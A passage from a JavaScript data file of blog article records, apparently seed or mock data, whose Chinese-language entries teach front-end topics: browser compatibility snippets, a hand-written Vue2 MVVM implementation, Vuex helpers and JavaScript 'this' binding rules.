          updatedAt: '2020-08-13T15:01:02.000Z',
        },
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 43,
      title: 'Bom和Dom一些兼容性写法',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        '## 获取样式\n\n### getComputedStyle\n\n> 普通浏览器\n\n### currentStyle\n\n> 兼容ie\n\n### 兼容性写法\n\n> 注意，这个方法在ie下如果获取没有设置的值，如设置了定位但是没有设置top值，获取top会返回auto，而其他浏览器会返回一个具体值，为了避免问题，最好给这个样式设置一个默认值\n\n```js\nfunction getStyle(obj, name) {\n    if (window.getComputedStyle) {\n        return window.getComputedStyle(obj, null)[name];  // 非ie\n    }\n    else {\n        return obj.currentStyle[name]; // ie\n    }\n}\n```\n\n## event\n\n```js\nlet event = event || window.event\n```\n\n## scrollTop\n\n```js\nlet st = document.body.scrollTop || document.documentElement.scrollTop\n```\n\n### 滚动到底部\n\n> chrome获取的scrollTop是小数，firefox获取的是整数\n\n```js\ninfo.scrollHeight - parseInt(info.scrollTop) == info.clientHeight\n```\n\n',
      click: 0,
      createdAt: '2020-08-13T14:58:18.000Z',
      updatedAt: '2021-02-16T13:14:53.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 43,
            article_id: 43,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 43,
            user_id: 1,
            article_id: 43,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 44,
      title: '实现vue的mvvm',
      is_comment: 1,
      status: 1,
      img: '/1597246545480mvvm.png',
      content:
        '## vue2实现mvvm原理\n\n> - 数据劫持\n>   - 主要通过 `Object.defineProperty()` 这个方法实现\n> - 发布订阅模式（观察者模式）\n\n## html\n\n```html\n<!DOCTYPE html>\n<html lang="en">\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>Document</title>\n</head>\n\n<body>\n    <div id="app">\n        {{title}}\n        <p>我叫：{{name}}，今年：<b>{{age}}</b>岁</p>\n        <p>爱好：{{hobby}}</p>\n        <p>车：{{car.benz}}、{{car.bmw}}、{{car.adui}}</p>\n        标题：<input type="text" v-model="title" value="" />\n        <br>\n        我叫：<input type="text" v-model="name" value="" />,\n        今年：<input type="text" v-model="age" value="" />岁。\n        <br>\n        想买：<input type="text" v-model="car.benz" value="" />、\n        <input type="text" v-model="car.bmw" value="" />、\n        <input type="text" v-model="car.adui" value="" />车\n    </div>\n\n    <script src="mvvm.js"></script>\n\n    <script>\n        let mvvm = new Mvvm({\n            el: "#app",\n            data: {\n                title: \'个人信息\',\n                name: \'cxk\',\n                age: 18,\n                hobby: [\'唱\', \'跳\', \'rap\'],\n                car: {\n                    benz: \'奔驰s级\',\n                    bmw: \'宝马5系\',\n                    adui: \'奥迪A系\'\n                }\n            }\n        })\n\n    </script>\n\n</body>\n\n</html>\n```\n\n\n\n## mvvm.js\n\n```js\nfunction Mvvm(options = {}) {\n    this.$el = options.el\n    this.$data = options.data\n    // 数据劫持\n    new Observe(options.data)\n    // 数据代理\n    for (let key in options.data) {\n        Object.defineProperty(this, key, {\n            enumerable: true,       // 可枚举\n            configurable: true,     // 可配置\n            get: function () {\n                return options.data[key]\n            },\n            set: function (newVal) {\n                options.data[key] = newVal\n            }\n        })\n    }\n    // 解析编译\n    new Compile(options.el, this)\n}\n\n\n// 解析编译\nclass Compile {\n    constructor(el, vm) {\n        this.el = el\n        this.vm = vm\n        // 解析编译\n        this.el = document.querySelector(el)\n        // 在内存中创建一个文档碎片\n        let fragment = document.createDocumentFragment();\n        let child\n        while (child = this.el.firstChild) {\n            // appendChild具有移动性，移一个少一个\n            fragment.appendChild(child)\n        }\n        // 在内存中编译解析\n        this.compile(fragment, vm)\n        // 将内存中的文档碎片替换到真实页面\n        this.el.appendChild(fragment)\n    }\n    compile(node, vm) {\n        node.childNodes.forEach(child => {\n            // 判断是不是元素节点\n            if (child.nodeType == 1) {\n                // 递归遍历元素节点\n                this.compile(child, vm)\n                // 编译元素节点\n                this.compileEle(child, vm)\n            } else {\n                // 编译文本节点\n                this.compileText(child, vm)\n            }\n        })\n    }\n    // 编译文本\n    compileText(node, vm) {\n        // 首先保存原本的文本内容\n        let text = node.textContent // 车：{{car.benz}}、{{car.bmw}}、{{car.adui}}\n        let reg = /\\{\\{(.[^\\}]*)\\}\\}/g\n        // 如果匹配到有值了才{{}}这种格式就进行编译\n        if (reg.test(text)) {\n            // 遍历将原本文本节点的{{}}依次替换成对应的值\n            let content = text.replace(/\\{\\{(.[^\\}]*)\\}\\}/g, (...args) => {\n                // 设置监听,这里利用闭包访问了原本的text\n                new Watcher(vm, args[1], function () {\n                    // 遍历将原本文本节点的{{}}依次替换成对应的值\n                    let content = text.replace(/\\{\\{(.[^\\}]*)\\}\\}/g, (...args) => {\n                        return getval(vm, args[1])\n                    })\n                    node.textContent = content\n                })\n                return getval(vm, args[1])\n\n            })\n            node.textContent = content\n        }\n    }\n    // 编译元素（v-model）\n    compileEle(node, vm) {\n        var attr = node.attributes;\n        // attr是类数组，通过展开运算符让其可遍历\n        [...attr].forEach(attr => {\n            let { name, value } = attr\n            if (name == \'v-model\') {\n                // 设置监听\n                new Watcher(vm, value, function (newValue) {\n                    node.value = newValue\n                })\n                // 双向绑定\n                node.addEventListener(\'input\', function (e) {\n                    let newvalue = e.target.value\n                    var arr = value.split(\'.\')\n                    arr.reduce((data, current, index) => {\n                        if (index == arr.length - 1) {\n                            data[current] = newvalue\n                        }\n                        return data[current]\n                    }, vm)\n                })\n                // 给v-model属性设置监听后，此时元素的v-model的数据就和data关联了，可以把这个属性移除了\n                node.removeAttribute(\'v-model\')\n            }\n        })\n    }\n}\n\n// 将{{car.benz}} {{car.bmw}}等转化为对应的值\nfunction getval(vm, expr) {\n    let val = vm;\n    var arr = expr.split(\'.\')\n    arr.forEach(k => {\n        val = val[k]\n    })\n    return val\n}\n\n\n// 数据劫持\nclass Observe {\n    constructor(data) {\n        this.observe(data)\n    }\n    observe(data) {\n        // 遍历将每一个数据分别定义响应式，分别监听\n        for (let key in data) {\n            this.defineReactive(data, key, data[key])\n        }\n\n    }\n    // 定义响应式\n    defineReactive(obj, key, val) {\n        if (typeof val == \'object\') {\n            this.observe(val)\n        }\n        var dep = new Dep();\n        console.log(dep);\n        Object.defineProperty(obj, key, {\n            enumerable: true,       // 可枚举\n            configurable: true,     // 可配置\n            get: function () {\n                // 只有new Watcher了，Dep.target才会有值（watcher实例），有值就将它插入观察者队列\n                if (Dep.target) {\n                    dep.addsub(Dep.target);\n                }\n                return val\n            },\n            set: function (newVal) {\n                // 如果新值和旧值一样，则不发布更新\n                if (newVal == val) {\n                    return\n                }\n                val = newVal\n                dep.notify();\n            }\n        })\n    }\n\n}\n\n// 观察者\nclass Dep {\n    constructor() {\n        this.subs = []\n    }\n    addsub(sub) {\n        this.subs.push(sub)\n    }\n    notify() {\n        // 遍历观察者队列，全部更新\n        this.subs.forEach(sub => sub.update())\n    }\n}\n\n// 被观察者\nclass Watcher {\n    constructor(vm, expr, fn) {\n        this.vm = vm;\n        this.expr = expr;\n        this.fn = fn;\n        this.oldValue = this.get()\n    }\n    get() {\n        // 只要new Watcher了，就会调用这个方法，将这个watcher实例赋值给全局的Dep.target\n        Dep.target = this;\n        let oldValue = getval(this.vm, this.expr)\n        this.update();\n        Dep.target = null;\n        // 如果获取的expr是值类型（字符串，数字...），则直接返回oldValue\n        // 如果获取的expr是引用类型（数组，对象），则重新拷贝一份，返回给oldValue\n        if (Object.prototype.toString.call(oldValue) == \'[object Array]\') {\n            let old = [...oldValue]\n            oldValue = old\n        }\n        return oldValue\n    }\n    update() {\n        let newValue = getval(this.vm, this.expr)\n        // 如果新旧值不一样，则将新值作为参数传给回调函数并执行\n        if (newValue !== this.oldValue) {\n            this.fn(newValue)\n        }\n    }\n}\n```\n\n## 参考\n\n- [bilibili视频1](https://www.bilibili.com/video/BV1o4411T7ib?p=2)\n- [csdn文章1](https://blog.csdn.net/wuxy720/article/details/80151610)\n- [csdn文章2](https://blog.csdn.net/tangxiujiang/article/details/79594860)',
      click: 23,
      createdAt: '2020-08-12T15:35:53.000Z',
      updatedAt: '2021-02-16T13:15:13.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 44,
            article_id: 44,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 44,
            user_id: 1,
            article_id: 44,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 5,
          name: 'vue',
          color: 'rgba(65, 184, 131, 1)',
          createdAt: '2020-07-04T15:19:33.000Z',
          updatedAt: '2020-07-04T15:19:33.000Z',
        },
      ],
    },
    {
      id: 42,
      title: 'vuex',
      is_comment: 1,
      status: 1,
      img: '/1596802741490flow.png',
      content:
        '# Vuex\n\n## 核心\n\n> state\n>\n> mutation\n>\n> action\n>\n> getter，模块内的getters不能和全局的getters重复，否则报错[vuex] duplicate getter key: getter1\n>\n> module\n\n# 注意!!!\n\n> ​\t在全局或者同一个模块里，mutation和action最好不要有重复的方法名，否则使用mapMutations和mapAction辅助函数时，如果mutation和action的方法名一样，写在后面的会覆盖前面的，因此mutation最好不要和action存在重复的方法！\n\n下面的代码当执行：this.add(10)时，由于...mapMutations在...mapActions的后面，因此，会执行mutation，而不会执行action！\n\n```vue\n<script>\nimport { mapMutations, mapActions } from "vuex";\nexport default {\n  name: "App",\n  methods: \n    ...mapActions([\n      "add", // 将 `this.add()` 映射为 `this.$store.dispatch(\'add\')`\n      "asyncAdd", // 将 `this.asyncAdd()` 映射为 `this.$store.dispatch(\'asyncAdd\')`\n      "foo/asyncAdd", // 将 `this[\'foo/asyncAdd\']()` 映射为 `this.$store.dispatch(\'foo/asyncAdd\')`\n      "foo/add" // 将 `this[\'foo/asyncAdd\']()` 映射为 `this.$store.dispatch(\'foo/asyncAdd\')`\n      // `mapActions` 也支持载荷：\n      // "asyncAdd" // 将 `this.asyncAdd(amount)` 映射为 `this.$store.dispatch(\'asyncAdd\', amount)`\n    ]),\n     ...mapMutations([\n      "add", // 将 `this.add()` 映射为 `this.$store.commit(\'add\')`\n      "foo/add" // 将 `this[\'foo/add\']()` 映射为 `this.$store.commit(\'foo/add\')`\n      // `mapMutations` 也支持载荷：\n      // "add" // 将 `this.add(amount)` 映射为 `this.$store.commit(\'add\', amount)`\n    ]),\n  }\n};\n</script>\n```\n\n# 辅助函数\n\n## mapState 辅助函数\n\n```vue\n<template>\n  <div>\n    <h1>我是bar</h1>\n    <!-- 全局的count:888 -->\n    <h2>全局的count:{{count}}</h2>\n    <!-- 全局的count:888 -->\n    <h2>全局的count:{{count11}}</h2>\n    <!-- foo的count:999 -->\n    <h2>foo的count:{{count1}}</h2>\n    <!-- fooaaa:100 -->\n    <h2>fooaaa:{{aaa}}</h2>\n    <!-- fooaaa:200 -->\n    <h2>foobbb:{{bbb}}</h2>\n    <!-- msg:我是msg -->\n    <h2>msg:{{msg}}</h2>\n  </div>\n</template>\n\n<script>\nimport { mapState } from "vuex";\nexport default {\n  data() {\n    return {\n      msg: "我是msg"\n    };\n  },\n  computed: {\n    ...mapState([\n      "count" // 映射 this.count 为 store.state.count\n    ]),\n    ...mapState({\n      count11: "count", // 传字符串参数 \'count\' 等同于 `state => state.count\n      count1: state => state.foo.count,\n      aaa: state => {\n        // 为了能够使用 `this` 获取局部状态，必须使用常规函数\n        // 这里用了箭头函数，访问不了this\n        // console.log(this); //undefined\n        return state.foo.fooaaa;\n      },\n      bbb(state) {\n        return state.foo.foobbb;\n      }\n    }),\n    barmsg() {\n      return this.msg;\n    }\n  }\n};\n</script>\n\n```\n\n## mapGetters 辅助函数\n\n```vue\n<template>\n  <div>\n    <!-- getter1:我是全局的getter1 -->\n    <h2>getter1:{{getter111}}</h2>\n    <!-- foogetter1:999 -->\n    <h2>foogetter1:{{foogetter1}}</h2>\n  </div>\n</template>\n\n<script>\nimport { mapState, mapGetters } from "vuex";\nexport default {\n  data() {\n    return {\n      msg: "我是msg"\n    };\n  },\n  computed: {\n    ...mapGetters({\n      getter111:\'getter1\' //把 `this.getter111` 映射为 `this.$store.getters.getter1`\n    }),\n    ...mapGetters([\n      \'foogetter1\'\n    ]),\n    barmsg() {\n      return this.msg;\n    }\n  }\n};\n</script>\n\n```\n\n## mapMutations 辅助函数\n\n```vue\n<template>\n  <div id="app">\n    <router-link to="/foo">foo</router-link>\n    <br />\n    <router-link to="/bar">bar</router-link>\n    <br />\n    <button @click="mutationBtn">mutation+10</button>\n    <button @click="add(10)">add(10)</button>\n    <button @click="add1(10)">add1(10)</button>\n    <router-view></router-view>\n  </div>\n</template>\n\n<script>\nimport { mapMutations } from "vuex";\nexport default {\n  name: "App",\n  methods: {\n    ...mapMutations({\n      add1: "add", // 将 `this.add1()` 映射为 `this.$store.commit(\'add\')`\n    }),\n    ...mapMutations([\n      "add", // 将 `this.add()` 映射为 `this.$store.commit(\'add\')`\n      "foo/add" // 将 `this[\'foo/add\']()` 映射为 `this.$store.commit(\'foo/add\')`\n      // `mapMutations` 也支持载荷：\n      // "add" // 将 `this.add(amount)` 映射为 `this.$store.commit(\'add\', amount)`\n    ]),\n    mutationBtn() {\n      this.add(10);\n      //this["foo/add"](10);\n    }\n  }\n};\n</script>\n\n```\n\n## mapActions 辅助函数\n\n```vue\n<template>\n  <div id="app">\n    <router-link to="/foo">foo</router-link>\n    <br />\n    <router-link to="/bar">bar</router-link>\n    <br />\n    <button @click="actionBtn">action+100</button>\n    <button @click="add2(100)">add2(100)</button>\n    <button @click="asyncAdd(100)">asyncAdd(100)</button>\n    <router-view></router-view>\n  </div>\n</template>\n\n<script>\nimport { mapActions } from "vuex";\nexport default {\n  name: "App",\n  methods: {\n    ...mapActions({\n      add2: "asyncAdd" // 将 `this.add2()` 映射为 `this.$store.dispatch(\'asyncAdd\')`\n    }),\n    ...mapActions([\n      "asyncAdd" // 将 `this.asyncAdd()` 映射为 `this.$store.dispatch(\'asyncAdd\')`\n      // `mapActions` 也支持载荷：\n      // "asyncAdd" // 将 `this.asyncAdd(amount)` 映射为 `this.$store.dispatch(\'asyncAdd\', amount)`\n    ]),\n    actionBtn() {\n      this.add2(100);\n      // this.$store.dispatch("asyncAdd", 100);\n    }\n  }\n};\n</script>\n\n```\n\n## modules命名空间\n\n```js\nimport mutations from \'store/foo/mutations.js\'\nimport actions from \'store/foo/actions.js\'\nimport getters from \'store/foo/getters.js\'\n\nconst foo = {\n    // 使用命名空间\n    namespaced: true,\n    state: {\n        count: 999,\n        fooaaa: 100,\n        foobbb: 200,\n        fooccc: 300,\n    },\n    getters,\n    // 同步\n    mutations,\n    // 异步\n    actions\n}\n\nexport default foo;\n```\n\n\n\n> 默认不开启命名空间，当调用模块里面的mutation或action时（模块内的getters不能和全局的getters重复），如果全局里面也有这个mutation或action，会都执行。\n>\n> ​\t使用了命名空间后，mutation和action的操作要带上模块名，不带模块名默认执行的是全局的mutation或action。\n\n```js\n//访问全局的add\nthis.$store.commit(\'add\', amount)\n//访问foo模块的add\nthis.$store.commit(\'foo/add\', amount)\n```\n\n\n\n### 在全局命名空间内分发 action 或提交 mutation\n\n> 将 `{ root: true }` 作为第三参数传给 `dispatch` 或 `commit` 即可。\n\n```js\nmodules: {\n  foo: {\n    namespaced: true,\n\n    actions: {\n      // 在这个模块中， dispatch 和 commit 也被局部化了\n      // 他们可以接受 `root` 属性以访问根 dispatch 或 commit\n      someAction ({ dispatch, commit, getters, rootGetters }) {\n      \n        dispatch(\'someOtherAction\') // -> \'foo/someOtherAction\'\n        dispatch(\'someOtherAction\', null, { root: true }) // -> \'someOtherAction\'\n\n        commit(\'someMutation\') // -> \'foo/someMutation\'\n        commit(\'someMutation\', null, { root: true }) // -> \'someMutation\'\n      },\n      someOtherAction (ctx, payload) { ... }\n    }\n  }\n}\n```\n\n### 在带命名空间的模块注册全局 action\n\n> 若需要在带命名空间的模块注册全局 action，你可添加 `root: true`，并将这个 action 的定义放在函数 `handler` 中。\n\n```js\nmodules: {\n    foo: {\n      namespaced: true,\n\n      actions: {\n        someAction: {\n          root: true,\n          handler (namespacedContext, payload) { ... } // -> \'someAction\'\n        }\n      }\n    }\n  }\n```\n\n',
      click: 6,
      createdAt: '2020-08-07T12:19:04.000Z',
      updatedAt: '2021-02-16T13:14:37.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 42,
            article_id: 42,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 42,
            user_id: 1,
            article_id: 42,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 5,
          name: 'vue',
          color: 'rgba(65, 184, 131, 1)',
          createdAt: '2020-07-04T15:19:33.000Z',
          updatedAt: '2020-07-04T15:19:33.000Z',
        },
        {
          id: 13,
          name: 'vuex',
          color: 'rgba(23, 113, 115, 1)',
          createdAt: '2020-07-05T05:46:07.000Z',
          updatedAt: '2020-07-05T05:46:07.000Z',
        },
      ],
    },
    {
      id: 41,
      title: '理解js的this',
      is_comment: 1,
      status: 1,
      img: '/1595920771436this.png',
      content:
        '# 为什么使用this\n\n如果没有this，那么我们的代码会是下面的写法：\n\n- 在方法中，为了能够获取到name名称，必须通过obj的引用（变量名称）来获取。\n- 但是这样做有一个很大的弊端：如果我将obj的名称换成了info，那么所有的方法中的obj都需要换成info。\n\n```js\nvar obj = {\n  name: "why",\n  running: function() {\n    console.log(obj.name + " running");\n  },\n  eating: function() {\n    console.log(obj.name + " eating");\n  },\n  studying: function() {\n    console.log(obj.name + " studying");\n  }\n}\n```\n\n- 当我们通过obj去调用running、eating、studying这些方法时，this就是指向的obj对象\n\n```js\nvar obj = {\n  name: "why",\n  running: function() {\n    console.log(this.name + " running");\n  },\n  eating: function() {\n    console.log(this.name + " eating");\n  },\n  studying: function() {\n    console.log(this.name + " studying");\n  }\n}\n```\n\n# this指向什么\n\n最简单的，this在全局作用域下指向什么？在浏览器中测试就是指向window，所以在全局作用域下，我们可以认为this就是指向的window\n\n```js\nconsole.log(this); // window\n\nvar name = "why";\nconsole.log(this.name); // why\nconsole.log(window.name); // why\n```\n\n定义一个函数，我们采用三种不同的方式对它进行调用，它产生了三种不同的结果\n\n```js\n// 定义一个函数\nfunction foo() {\n  console.log(this);\n}\n\n// 1.调用方式一: 直接调用\nfoo(); // window\n\n// 2.调用方式二: 将foo放到一个对象中,再调用\nvar obj = {\n  name: "why",\n  foo: foo\n}\nobj.foo() // obj对象\n\n// 3.调用方式三: 通过call/apply调用\nfoo.call("abc"); // String {"abc"}对象\n```\n\n上面的案例说明了一下问题：\n\n- 1.函数在调用时，JavaScript会默认给this绑定一个值；\n- 2.this的绑定和定义的位置（编写的位置）没有关系；\n- 3.this的绑定和调用方式以及调用的位置有关系；\n- 4.this是在运行时被绑定的；\n\n# this绑定规则\n\n## 默认绑定\n\n在独立函数调用的情况下使用默认绑定\n\n- 独立的函数调用我们可以理解成函数没有被绑定到某个对象上进行调用；\n\n**案例一：普通函数调用**\n\n```js\nfunction foo() {\n  console.log(this); // window\n}\n\nfoo();\n```\n\n**案例二：函数调用链（一个函数又调用另外一个函数）**\n\n- 所有的函数调用都没有被绑定到某个对象上；\n\n```js\n// 2.案例二:\nfunction test1() {\n  console.log(this); // window\n  test2();\n}\n\nfunction test2() {\n  console.log(this); // window\n  test3()\n}\n\nfunction test3() {\n  console.log(this); // window\n}\ntest1();\n```\n\n**案例三：将函数作为参数，传入到另一个函数中**\n\n```js\nfunction foo(func) {\n  func()\n}\n\nfunction bar() {\n  console.log(this); // window\n}\n\nfoo(bar);\n```\n\n对案例进行一些修改，打印结果是否会发生变化：\n\n- 这里的结果依然是window，原因非常简单，在真正函数调用的位置，并没有进行任何的对象绑定，只是一个独立函数的调用；\n\n```js\nfunction foo(func) {\n  func()\n}\n\nvar obj = {\n  name: "why",\n  bar: function() {\n    console.log(this); // window\n  }\n}\n\nfoo(obj.bar);\n```\n\n## 隐式绑定\n\n另外一种比较常见的调用方式是通过某个对象进行调用的：\n\n- 也就是它的调用位置中，是通过某个对象发起的函数调用。\n\n**案例一：通过对象调用函数**\n\n- foo的调用位置是obj.foo()方式进行调用的\n- 那么foo调用时this会隐式的被绑定到obj对象上\n\n```js\nfunction foo() {\n  console.log(this); // obj对象\n}\n\nvar obj = {\n  name: "why",\n  foo: foo\n}\nobj.foo();\n```\n\n**案例二：案例一的变化**\n\n- 我们通过obj2又引用了obj1对象，再通过obj1对象调用foo函数；\n- 那么foo调用的位置上其实还是obj1被绑定了this；\n\n```js\nfunction foo() {\n  console.log(this); // obj1对象\n}\n\nvar obj1 = {\n  name: "obj1",\n  foo: foo\n}\n\nvar obj2 = {\n  name: "obj2",\n  obj1: obj1\n}\n\nobj2.obj1.foo();\n```\n\n**案例三：隐式丢失**\n\n- 结果最终是window\n- 因为foo最终被调用的位置是bar，而bar在进行调用时没有绑定任何的对象，也就没有形成隐式绑定；\n- 相当于是一种默认绑定；\n\n```js\nfunction foo() {\n  console.log(this);\n}\n\nvar obj1 = {\n  name: "obj1",\n  foo: foo\n}\n\n// 讲obj1的foo赋值给bar\nvar bar = obj1.foo;\nbar();\n```\n\n\n\n## 显示绑定\n\n- 通过call或者apply绑定this对象\n\ncall和apply第一个参数是相同的，后面的参数，apply为数组，call为参数列表\n\napply 最后还是转化成 call 来执行的，call 要更快毫无疑问，call性能好一丢丢\n\n显示绑定后，this就会明确的指向绑定的对象\n\n```js\nfunction foo() {\n  console.log(this);\n}\n\nfoo.call(window); // window\nfoo.call({name: "why"}); // {name: "why"}\nfoo.call(123); // Number {123}\n```\n\n- 使用Function.prototype.bind\n\n```js\nfunction foo() {\n  console.log(this);\n}\n\nvar obj = {\n  name: "why"\n}\n\nvar bar = foo.bind(obj);\n\nbar(); // obj对象\nbar(); // obj对象\nbar(); // obj对象\n```\n\n- 内置函数\n\n**案例一：setTimeout**\n\nsetTimeout中会传入一个函数，这个函数中的this通常是window\n\n```js\nsetTimeout(function() {\n  console.log(this); // window\n}, 1000);\n```\n\n为什么是window?\n\n- 这个和setTimeout源码的内部调用有关；\n- setTimeout内部是通过apply进行绑定的this对象，并且绑定的是全局对象；\n\n**案例二：数组的forEach**\n\n数组有一个高阶函数forEach，用于函数的遍历：\n\n- 在forEach中传入的函数打印的也是Window对象；\n- 这是因为默认情况下传入的函数是自动调用函数（默认绑定）；\n\n```js\nvar names = ["abc", "cba", "nba"];\nnames.forEach(function(item) {\n  console.log(this); // 三次window\n});\n```\n\n```js\nvar names = ["abc", "cba", "nba"];\nvar obj = {name: "why"};\nnames.forEach(function(item) {\n  console.log(this); // 三次obj对象\n}, obj);\n```\n\n**案例三：div的点击**\n\n获取元素节点，并且监听点击：\n\n- 在点击事件的回调中，this指向谁呢？box对象；\n- 这是因为在发生点击时，执行传入的回调函数被调用时，会将box对象绑定到该函数中；\n\n```js\nvar box = document.querySelector(".box");\nbox.onclick = function() {\n  console.log(this); // box对象\n}\n```\n\n## new绑定\n\n使用new关键字来调用函数时，会执行如下的操作：\n\n1. 创建一个全新的对象；\n2. 这个新对象会被执行Prototype连接；\n3. 这个新对象会绑定到函数调用的this上（this的绑定在这个步骤完成）；\n4. 如果函数没有返回其他对象，表达式会返回这个新对象；\n\n```js\n// 创建Person\nfunction Person(name) {\n  console.log(this); // Person {}\n  this.name = name; // Person {name: "why"}\n}\n\nvar p = new Person("why");\nconsole.log(p);\n```\n\n# 规则优先级\n\n## **默认规则的优先级最低**\n\n默认规则的优先级是最低的，因为存在其他规则时，就会通过其他规则的方式来绑定this\n\n## **显示绑定优先级高于隐式绑定**\n\n```js\nfunction foo() {\n  console.log(this);\n}\n\nvar obj1 = {\n  name: "obj1",\n  foo: foo\n}\n\nvar obj2 = {\n  name: "obj2",\n  foo: foo\n}\n\n// 隐式绑定\nobj1.foo(); // obj1\nobj2.foo(); // obj2\n\n// 隐式绑定和显示绑定同时存在\nobj1.foo.call(obj2); // obj2, 说明隐式绑定优先级更高\n```\n\n## **new绑定优先级高于隐式绑定**\n\n```js\nfunction foo() {\n  console.log(this);\n}\n\nvar obj = {\n  name: "why",\n  foo: foo\n}\n\nnew obj.foo(); // foo对象, 说明new绑定优先级更高\n```\n\n## **new绑定优先级高于bind**\n\nnew绑定和call、apply是不允许同时使用的，所以不存在谁的优先级更高\n\n```js\nfunction foo() {\n  console.log(this);\n}\n\nvar obj = {\n  name: "obj"\n}\n\nvar foo = new foo.call(obj);\t// Uncaught TypeError: foo.call is not a constructor\n```\n\nnew绑定可以和bind后的函数同时使用\n\n```js\nfunction foo() {\n  console.log(this);\n}\n\nvar obj = {\n  name: "obj"\n}\n\n// var foo = new foo.call(obj);\nvar bar = foo.bind(obj);\nvar foo = new bar(); // 打印foo, 说明使用的是new绑定\n```\n\n## 优先级总结\n\nnew绑定 > 显示绑定（bind）> 隐式绑定 > 默认绑定\n\n# 规则之外\n\n## 忽略显示绑定\n\n如果在显示绑定中，我们传入一个null或者undefined，那么这个显示绑定会被忽略，使用默认规则：\n\n```js\nfunction foo() {\n  console.log(this);\n}\n\nvar obj = {\n  name: "why"\n}\n\nfoo.call(obj); // obj对象\nfoo.call(null); // window\nfoo.call(undefined); // window\n\nvar bar = foo.bind(null);\nbar(); // window\n```\n\n另外一种情况，创建一个函数的 `间接引用`，这种情况使用默认绑定规则。\n\n```js\nfunction foo() {\n  console.log(this);\n}\n\nvar obj1 = {\n  name: "obj1",\n  foo: foo\n}; \n\nvar obj2 = {\n  name: "obj2"\n}\n\nobj1.foo(); // obj1对象\n(obj2.foo = obj1.foo)();  // window\n```\n\n## ES6箭头函数\n\n我们来看一个模拟网络请求的案例：\n\n- 这里我使用setTimeout来模拟网络请求，请求到数据后如何可以存放到data中呢？\n- 我们需要拿到obj对象，设置data；\n- 但是直接拿到的this是window，我们需要在外层定义：`var _this = this`\n- 在setTimeout的回调函数中使用_this就代表了obj对象\n\n```js\nvar obj = {\n  data: [],\n  getData: function() {\n    var _this = this;\n    setTimeout(function() {\n      // 模拟获取到的数据\n      var res = ["abc", "cba", "nba"];\n      _this.data.push(...res);\n    }, 1000);\n  }\n}\n\nobj.getData();\n```\n\n箭头函数并不绑定this对象，那么this引用就会从上层作用域中找到对应的this\n\n```js\nvar obj = {\n  data: [],\n  getData: function() {\n    setTimeout(() => {\n      // 模拟获取到的数据\n      var res = ["abc", "cba", "nba"];\n      this.data.push(...res);\n    }, 1000);\n  }\n}\n\nobj.getData();\n```\n\n如果getData也是一个箭头函数，那么setTimeout中的回调函数中的this指向谁\n\n- 答案是window；\n- 依然是不断的从上层作用域找，那么找到了全局作用域；\n- 在全局作用域内，this代表的就是window\n\n```js\nvar obj = {\n  data: [],\n  getData: () => {\n    setTimeout(() => {\n      console.log(this); // window\n    }, 1000);\n  }\n}\n\nobj.getData();\n```',
      click: 9,
      createdAt: '2020-07-28T07:19:34.000Z',
      updatedAt: '2021-02-16T13:14:21.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 41,
            article_id: 41,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 41,
            user_id: 1,
            article_id: 41,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
